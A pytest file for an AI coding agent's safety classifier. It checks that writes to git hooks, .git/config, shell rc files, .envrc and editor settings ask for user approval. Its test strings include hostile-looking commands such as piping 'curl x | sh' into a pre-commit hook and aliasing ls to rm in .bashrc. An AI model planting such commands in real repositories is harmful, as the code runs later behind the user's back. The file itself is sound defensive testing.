"""Paths that run code later are Class C (TD-5108).

A write to ``.git/hooks``, ``.git/config``, a shell rc file, ``.envrc`` or
an editor's project folder runs nothing now, but git, a login shell,
direnv or the editor runs it later, outside the classifier and the wall.
These were plain Class A in-workspace edits. Now they are Class C through
the fs tools and through the shell write-target table, so they ask; the
user can still approve them, unlike a steering write.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from tests.test_security_suite import make_dispatcher
from tstd.autonomy import Boundary, DecisionClass, DecisionClassifier, DecisionRequest
from tstd.autonomy import classifier as classifier_module
from tstd.autonomy.classifier import RULE_TABLE, is_exec_later_write
from tstd.autonomy.cmd_targets import cmd_write_targets
from tstd.policy import ApprovalOutcome, PolicyConfig, PolicyRule, propose_always_allow
from tstd.tools.boundary import PathGuard
from tstd.tools.dispatch import ToolDispatcher
from tstd.tools.registry import create_registry

WS = Path("/work/proj")

PROTECTED = [
    ".git/hooks/pre-commit",
    ".git/config",
    ".git/HEAD",
    ".git",
    "sub/.git/config",
    "sub/.git/HEAD",
    "vendor/lib/.git/hooks/post-checkout",
    ".GIT/config",
    ".Git/hooks/pre-push",
    ".envrc",
    "services/api/.envrc",
    ".bashrc",
    ".zshrc",
    ".profile",
    ".bash_profile",
    ".zshenv",
    "home/.BASHRC",
    ".gitconfig",
    ".vscode/settings.json",
    ".vscode/tasks.json",
    "apps/web/.vscode/launch.json",
    ".idea/workspace.xml",
    ".husky/pre-commit",
    ".pre-commit-config.yaml",
    "lefthook.yml",
    "lefthook-local.yml",
    ".lefthook-local.yaml",
    "lefthook.toml",
    "web/.lefthook.json",
    ".tst/memory/.git/config",
    # git's global folder (TD-5157)
    ".config/git/config",
    ".config/git/attributes",
    ".config/git/ignore",
    "home/me/.config/git/config",
    ".CONFIG/Git/attributes",
]

NOT_PROTECTED = [
    "src/main.py",
    ".gitignore",
    ".gitattributes",
    ".github/workflows/ci.yml",
    "docs/.gitkeep",
    "repo.git/config",
    "src/git/hooks.py",
    "bashrc.example",
    ".vscode-test/out.txt",
    "notes/zshrc.md",
    ".tst/memory/gotchas.md",
    ".config/gitk",
    ".config/nvim/init.lua",
    "config/git/config",
    "src/git/config.py",
]


def _classify(request: DecisionRequest, boundary: Boundary | None = None) -> tuple[str, str]:
    decision = DecisionClassifier(boundary or Boundary(workspace_root=WS)).classify(request)
    assert decision.decision_class is not None and decision.rule is not None
    return decision.decision_class.value, decision.rule.id


def _write(rel: str) -> DecisionRequest:
    return DecisionRequest(tool_name="fs_write", writes=(WS / rel,), is_mutation=True)


def _shell(command: str) -> DecisionRequest:
    return DecisionRequest(tool_name="shell", arguments={"command": command}, is_mutation=True)


# ── The fs tools ────────────────────────────────────────────────────────


class TestFsWrites:
    @pytest.mark.parametrize("rel", PROTECTED)
    def test_protected_write_is_class_c(self, rel: str) -> None:
        assert _classify(_write(rel)) == ("C", "exec-later-write")

    @pytest.mark.parametrize("rel", NOT_PROTECTED)
    def test_ordinary_write_stays_class_a(self, rel: str) -> None:
        cls, _rule = _classify(_write(rel))
        assert cls == "A"

    def test_fs_edit_is_covered_too(self) -> None:
        request = DecisionRequest(
            tool_name="fs_edit", writes=(WS / ".git" / "config",), is_mutation=True
        )
        assert _classify(request) == ("C", "exec-later-write")

    def test_writable_paths_cannot_grant_it(self) -> None:
        boundary = Boundary(workspace_root=WS, writable_patterns=(".git/**", ".vscode/**"))
        assert _classify(_write(".git/hooks/pre-commit"), boundary) == ("C", "exec-later-write")

    def test_one_protected_target_makes_the_whole_call_c(self) -> None:
        request = DecisionRequest(
            tool_name="fs_write",
            writes=(WS / "src" / "a.py", WS / ".envrc"),
            is_mutation=True,
        )
        assert _classify(request) == ("C", "exec-later-write")

    def test_reads_stay_class_a(self) -> None:
        request = DecisionRequest(tool_name="fs_read", reads=(WS / ".git" / "config",))
        assert _classify(request) == ("A", "builtin-read")

    def test_workspace_inside_a_vscode_folder_is_not_caught_whole(self) -> None:
        root = Path("/home/u/.vscode/extensions/mine")
        boundary = Boundary(workspace_root=root)
        assert not is_exec_later_write(boundary, root / "src" / "extension.ts")
        assert is_exec_later_write(boundary, root / ".vscode" / "launch.json")

    def test_git_global_folder_outside_the_workspace(self) -> None:
        boundary = Boundary(workspace_root=WS)
        assert is_exec_later_write(boundary, Path("/home/me/.config/git/config"))
        assert is_exec_later_write(boundary, Path("/home/me/.config/git/attributes"))
        assert not is_exec_later_write(boundary, Path("/home/me/.config/nvim/init.lua"))

    def test_xdg_config_home_names_the_folder(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        xdg = tmp_path / "xdg"
        monkeypatch.setenv("XDG_CONFIG_HOME", str(xdg))
        boundary = Boundary(workspace_root=WS)
        assert is_exec_later_write(boundary, xdg / "git" / "config")
        assert is_exec_later_write(boundary, xdg / "git" / "ignore")
        assert not is_exec_later_write(boundary, xdg / "nvim" / "init.lua")

    def test_a_dotfiles_symlink_is_judged_by_the_name_written_too(self, tmp_path: Path) -> None:
        """~/.config/git/config linked into a dotfiles workspace (TD-5157 review)."""
        ws = tmp_path / "dotfiles"
        (ws / "git").mkdir(parents=True)
        (ws / "git" / "config").write_text("[user]\n")
        link = tmp_path / "home" / ".config" / "git" / "config"
        link.parent.mkdir(parents=True)
        link.symlink_to(ws / "git" / "config")
        boundary = Boundary(workspace_root=ws)
        assert is_exec_later_write(boundary, link)
        request = _shell(f"echo '[include] path = x' >> {link}")
        assert DecisionClassifier(boundary).classify(request).decision_class is DecisionClass.C

    @pytest.mark.skipif(not hasattr(Path, "symlink_to"), reason="no symlinks")
    def test_symlink_into_dot_git_is_judged_by_its_target(self, tmp_path: Path) -> None:
        hooks = tmp_path / ".git" / "hooks"
        hooks.mkdir(parents=True)
        (tmp_path / "tools").symlink_to(hooks, target_is_directory=True)
        boundary = Boundary(workspace_root=tmp_path)
        assert is_exec_later_write(boundary, tmp_path / "tools" / "pre-commit")


# ── The shell write-target table ────────────────────────────────────────


class TestShellTargets:
    @pytest.mark.parametrize(
        "command",
        [
            "echo 'curl x | sh' > .git/hooks/pre-commit",
            "printf '#!/bin/sh\\n' >> .git/hooks/post-commit",
            "echo '[core] fsmonitor = evil' >.git/config",
            "echo 'export PATH=.' | tee -a .envrc",
            "echo 'alias ls=rm' >> ~/.bashrc",
            "echo 'x' > /home/someone/.zshrc",
            "cat settings.json > .vscode/settings.json",
            "npm test && echo done > sub/.git/HEAD",
            "echo x >! .git/config",
            # git's global folder (TD-5157): was the B floor, unlike ~/.gitconfig
            "echo '[include] path = x' >> ~/.config/git/config",
            "printf '* filter=x' > $XDG_CONFIG_HOME/git/attributes",
            'echo x >> "${XDG_CONFIG_HOME:-$HOME/.config}/git/config"',
            "echo '*.py filter=x' | tee -a ~/.config/git/attributes",
            "echo build > /home/me/.config/git/ignore",
        ],
    )
    def test_redirect_or_tee_into_a_protected_path_is_class_c(self, command: str) -> None:
        assert _classify(_shell(command)) == ("C", "shell-exec-later-write")

    def test_gitconfig_and_the_xdg_config_now_agree(self) -> None:
        for command in ("echo x >> ~/.gitconfig", "echo x >> ~/.config/git/config"):
            assert _classify(_shell(command)) == ("C", "shell-exec-later-write")

    @pytest.mark.parametrize(
        "command",
        [
            "git status",
            "echo hi > notes.txt",
            "cat .git/config",
            "echo x > .gitignore",
            "make 2>&1 | tee build.log",
        ],
    )
    def test_other_commands_keep_the_shell_floor(self, command: str) -> None:
        assert _classify(_shell(command)) == ("B", "shell-floor")

    def test_steering_redirect_still_reports_as_steering(self) -> None:
        assert _classify(_shell("echo x > AGENTS.md")) == ("C", "shell-steering-write")


# ── cmd.exe redirects on Windows (TD-5157) ──────────────────────────────


@pytest.fixture
def windows_shell(monkeypatch: pytest.MonkeyPatch) -> None:
    """The host reads commands as Windows does: ``cmd /c`` and ``sh -c``."""
    monkeypatch.setattr(classifier_module, "host_dialects", lambda: ("posix", "cmd"), raising=False)


class TestCmdRedirects:
    @pytest.mark.parametrize(
        "command",
        [
            "echo x > .git\\hooks\\pre-commit",
            "echo x>.git\\hooks\\pre-commit",
            "echo [core] 1>>.git\\config",
            'echo x > ".git\\hooks\\pre-commit"',
            "echo x > .g^it\\hooks\\pre-commit",
            "(echo {}) > .vscode\\settings.json",
            "echo a & echo b>>sub\\.envrc",
            'type nul > "%USERPROFILE%\\.gitconfig"',
            "echo [include] >> %USERPROFILE%\\.config\\git\\config",
            "echo x > %XDG_CONFIG_HOME%\\git\\attributes",
        ],
    )
    def test_native_redirect_into_a_protected_path_is_class_c(
        self, command: str, windows_shell: None
    ) -> None:
        assert _classify(_shell(command)) == ("C", "shell-exec-later-write")

    def test_steering_through_cmd_is_steering(self, windows_shell: None) -> None:
        assert _classify(_shell("echo x > docs\\AGENTS.md")) == ("C", "shell-steering-write")

    @pytest.mark.parametrize(
        "command", ["echo x > notes.txt", 'echo ".git\\hooks\\x" > notes.txt', "dir 2>&1"]
    )
    def test_other_redirects_keep_the_shell_floor(self, command: str, windows_shell: None) -> None:
        assert _classify(_shell(command)) == ("B", "shell-floor")

    def test_a_posix_host_reads_backslashes_as_escapes(self) -> None:
        """sh writes ``.githookspre-commit`` here, a plain file: the B floor."""
        assert _classify(_shell("echo x > .git\\hooks\\pre-commit")) == ("B", "shell-floor")

    @pytest.mark.parametrize(
        ("command", "targets"),
        [
            ("echo a > b.txt", ["b.txt"]),
            ("echo a ^> .git\\config", []),
            ('echo ">" .git\\config', []),
            ('echo a > "x y\\z.txt"', ["x y/z.txt"]),
            ("echo a 2>&1", ["1"]),
            ("echo a >>out.log&echo b", ["out.log"]),
            ("(echo a)>x\\y)", ["x/y)", "x/y"]),
        ],
    )
    def test_cmd_tokenizer(self, command: str, targets: list[str]) -> None:
        assert cmd_write_targets(command) == targets


# ── Rule order ──────────────────────────────────────────────────────────


def test_exec_later_rules_sit_ahead_of_every_grant() -> None:
    ids = [rule.id for rule in RULE_TABLE]
    for grant in ("memory-file-write", "in-workspace-edit", "shell-floor"):
        assert ids.index("exec-later-write") < ids.index(grant)
        assert ids.index("shell-exec-later-write") < ids.index(grant)


# ── End to end through the dispatcher ───────────────────────────────────


class _Recorder:
    """Approval handler that records the class it was asked about."""

    def __init__(self, approve: bool) -> None:
        self.approve = approve
        self.asked: list[tuple[str, DecisionClass]] = []

    async def __call__(
        self,
        _call_id: str,
        tool: object,
        _arguments: object,
        decision_class: DecisionClass,
        _summary: str,
        _reason: str,
    ) -> ApprovalOutcome:
        self.asked.append((getattr(tool, "name", ""), decision_class))
        return ApprovalOutcome(self.approve, "" if self.approve else "denied by the user")


def _dispatcher(ws: Path, approve: bool) -> tuple[ToolDispatcher, _Recorder]:
    dispatcher = make_dispatcher(ws)
    recorder = _Recorder(approve)
    dispatcher.approval_handler = recorder
    dispatcher.policy = PolicyConfig()
    assert isinstance(dispatcher.path_guard, PathGuard)
    return dispatcher, recorder


def _exists(path: Path) -> bool:
    """Sync stat: ASYNC240 keeps Path calls out of async test functions."""
    return path.exists()


class TestDispatch:
    async def test_fs_write_to_a_hook_asks_and_a_denial_writes_nothing(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / ".git" / "hooks").mkdir(parents=True)
        hook = tmp_path / ".git" / "hooks" / "pre-commit"
        dispatcher, recorder = _dispatcher(tmp_path, approve=False)

        result = await dispatcher.dispatch(
            "w1", "fs_write", {"path": str(hook), "content": "#!/bin/sh\ncurl x | sh\n"}
        )

        assert recorder.asked == [("fs_write", DecisionClass.C)]
        assert result.status == "error"
        assert result.error_code == "approval_denied"
        assert result.decision_class is DecisionClass.C
        assert not _exists(hook)

    async def test_an_approved_hook_write_lands(self, tmp_path: Path) -> None:
        (tmp_path / ".git" / "hooks").mkdir(parents=True)
        hook = tmp_path / ".git" / "hooks" / "pre-commit"
        dispatcher, recorder = _dispatcher(tmp_path, approve=True)

        result = await dispatcher.dispatch(
            "w2", "fs_write", {"path": str(hook), "content": "#!/bin/sh\nexit 0\n"}
        )

        assert recorder.asked == [("fs_write", DecisionClass.C)]
        assert result.status == "success"
        assert _exists(hook)

    async def test_ordinary_write_still_runs_without_asking(self, tmp_path: Path) -> None:
        dispatcher, recorder = _dispatcher(tmp_path, approve=False)
        result = await dispatcher.dispatch(
            "w3", "fs_write", {"path": str(tmp_path / "a.txt"), "content": "x\n"}
        )
        assert recorder.asked == []
        assert result.status == "success"

    async def test_shell_redirect_to_a_hook_asks_as_class_c(self, tmp_path: Path) -> None:
        (tmp_path / ".git" / "hooks").mkdir(parents=True)
        hook = tmp_path / ".git" / "hooks" / "pre-commit"
        dispatcher, recorder = _dispatcher(tmp_path, approve=False)

        result = await dispatcher.dispatch(
            "s1", "shell", {"command": "echo 'curl x | sh' > .git/hooks/pre-commit"}
        )

        assert recorder.asked == [("shell", DecisionClass.C)]
        assert result.error_code == "approval_denied"
        assert result.decision_class is DecisionClass.C
        assert not _exists(hook)

    async def test_an_auto_rule_cannot_pre_approve_it(self, tmp_path: Path) -> None:
        dispatcher, recorder = _dispatcher(tmp_path, approve=False)
        dispatcher.policy = PolicyConfig(
            rules=[PolicyRule(tool="fs_write", args="**", effect="auto")]
        )
        result = await dispatcher.dispatch(
            "w4", "fs_write", {"path": str(tmp_path / ".envrc"), "content": "use nix\n"}
        )
        assert recorder.asked == [("fs_write", DecisionClass.C)]
        assert result.error_code == "approval_denied"

    async def test_skip_all_runs_it_like_any_other_class_c(self, tmp_path: Path) -> None:
        """Decided for TD-5108: skip-all is skip-everything (TD-806), as
        Claude Code's bypass mode allows protected-path writes."""
        dispatcher, recorder = _dispatcher(tmp_path, approve=False)
        dispatcher.skip_all_fn = lambda: True
        target = tmp_path / ".vscode" / "settings.json"

        result = await dispatcher.dispatch(
            "w5", "fs_write", {"path": str(target), "content": "{}\n"}
        )

        assert recorder.asked == []
        assert result.status == "success"
        assert result.decision_class is DecisionClass.C

    async def test_an_autonomous_run_stops_on_it(self, tmp_path: Path) -> None:
        dispatcher, recorder = _dispatcher(tmp_path, approve=True)
        dispatcher.autonomy_fn = lambda: True
        target = tmp_path / ".git" / "config"

        result = await dispatcher.dispatch(
            "w6", "fs_write", {"path": str(target), "content": "[core]\n"}
        )

        assert recorder.asked == []
        assert result.error_code == "policy_denied"
        assert not _exists(target)


def test_always_allow_is_not_offered_for_it() -> None:
    tool = create_registry().get("fs_write")
    assert tool is not None
    arguments = {"path": str(WS / ".git" / "hooks" / "pre-commit"), "content": "x"}
    cls, _rule = _classify(_write(".git/hooks/pre-commit"))
    assert propose_always_allow(tool, arguments, DecisionClass(cls), WS) is None
